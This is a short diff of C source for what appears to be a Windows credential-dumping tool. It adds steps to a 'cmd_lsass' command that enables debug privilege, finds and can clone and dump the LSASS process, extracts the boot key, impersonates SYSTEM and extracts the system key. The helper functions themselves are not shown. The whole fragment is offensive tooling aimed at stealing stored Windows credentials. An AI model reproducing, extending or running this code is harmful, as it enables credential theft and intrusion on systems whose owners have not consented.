@@ -58,6 +58,7 @@ int cmd_token(int argc, char *argv[]) {
   return 0;
 }
 int cmd_lsass(int argc, char *argv[]) {
+
   struct arg_end *end;
   struct arg_lit *help;
   struct arg_lit *clone = arg_lit0("c", "clone", "clone lsass and dump");
@@ -89,6 +90,15 @@ int cmd_lsass(int argc, char *argv[]) {
   HANDLE lsassPID = Find();
   // printf("Handle value: %p\n", lsassPID);
   EnablePrivilege("debug");
+  //  NTSTATUS status = ImpersonateSystem();
+  //  if (status != 0) {
+  //    printf("status failed for impersonation: 0x%08lX\n", status);
+  //    return 1;
+  //  }
+
+  UINT8 *bootKey = ExtractBootKey();
+  ImpersonateSystem();
+  ExtractSystemKey(bootKey);
 
   if (lsassPID != NULL) {
     if (clone->count > 0) {
